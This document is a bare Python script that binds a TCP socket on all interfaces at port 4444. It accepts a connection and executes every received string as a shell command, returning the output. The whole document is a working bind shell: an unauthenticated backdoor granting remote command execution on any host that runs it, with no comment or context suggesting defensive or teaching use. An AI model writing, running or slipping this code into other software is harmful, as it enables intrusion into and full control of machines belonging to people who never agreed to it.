import socket
import subprocess

# Define the server's IP address and port
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 4444

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the address and port
server_socket.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server_socket.listen(5)
print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")

# Accept connections
client_socket, client_address = server_socket.accept()
print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")

# Start receiving commands from the client
while True:
    # Receive command from the client
    command = client_socket.recv(1024).decode()

    # If the command is 'exit', break the loop
    if command.lower() == 'exit':
        break

    # Execute the command and retrieve the output
    output = subprocess.getoutput(command)

    # Send the output back to the client
    client_socket.send(output.encode())

# Close the client socket
client_socket.close()

# Close the server socket
server_socket.close()
